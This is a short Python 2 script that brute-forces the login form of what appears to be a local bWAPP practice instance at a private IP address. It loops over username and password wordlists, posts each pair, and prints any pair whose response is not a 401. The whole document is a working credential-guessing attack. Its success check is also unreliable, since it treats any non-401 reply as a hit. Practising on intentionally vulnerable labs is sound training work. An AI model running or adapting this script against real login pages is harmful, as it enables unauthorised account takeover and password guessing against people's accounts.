import requests



password1 = open("password.txt","r")
password2 = password1.readlines()
user1 = open("users.txt","r")
user2= user1.readlines()



def getAuthorized (url, login, password):
    r = requests.post(url, data={'login':login,'password':password, 'security_level':'0','form':'submit'})
    
     
    if str(r.status_code) != '401':
        print "\n ** Username: " + login + " Password: " + password + " http_code: " + str(r.status_code) + "\n"
	print r.url



print "/****************************************/"
print "/* Brute-force on going, please wait... */"
print "/****************************************/"

for name in user2:
    for password in password2:
        getAuthorized("http://192.168.1.5/bwapp/login.php", name.rstrip(),password.rstrip())



password1.close()
user1.close()
        


